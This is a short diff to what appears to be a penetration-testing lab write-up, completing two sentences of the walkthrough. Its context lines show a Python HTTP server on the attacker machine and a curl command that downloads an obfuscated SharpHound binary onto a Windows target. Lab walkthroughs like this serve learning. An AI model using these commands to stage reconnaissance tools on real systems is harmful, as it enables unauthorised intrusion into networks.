@@ -563,7 +563,7 @@ So after looking around for a while, im going to try upload sharphound to see if
 python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-Ill start a web 
+Ill start a web server
 
 ```python
 curl http://10.200.52.144:8000/SharpHound.exe._obf.exe -o sharphound-obf.exe
@@ -581,3 +581,5 @@ Mode                LastWriteTime         Length Name
 
 PS C:\temp> 
 ```
+Now its on the target
+
